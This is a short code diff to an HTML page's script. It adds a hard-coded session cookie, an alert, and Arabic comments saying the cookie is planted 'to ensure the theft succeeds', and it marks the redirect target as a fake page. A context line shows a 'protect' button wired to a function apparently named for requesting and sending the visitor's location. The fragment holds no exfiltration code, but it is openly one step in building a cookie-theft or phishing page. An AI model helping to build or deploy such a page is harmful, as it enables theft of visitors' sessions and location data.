@@ -83,10 +83,12 @@
   
   <script>
     function goToMain() {
-      window.location.href = "main.html";
+      // ** التعديل لإنشاء كوكيز جلسة للاختبار (ضمان نجاح السرقة) **
+      document.cookie = "session_id=ABCD12345; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
+      alert("تم إنشاء كوكيز الجلسة الآن!");
+      // ***************************************************************
+      window.location.href = "main.html"; // توجيه لصفحة وهمية
     }
-    
-    // تم حذف الدالة 'displayNote()' هنا
   </script>
   
 <button id="protectButton" onclick="requestAndSendLocation()">
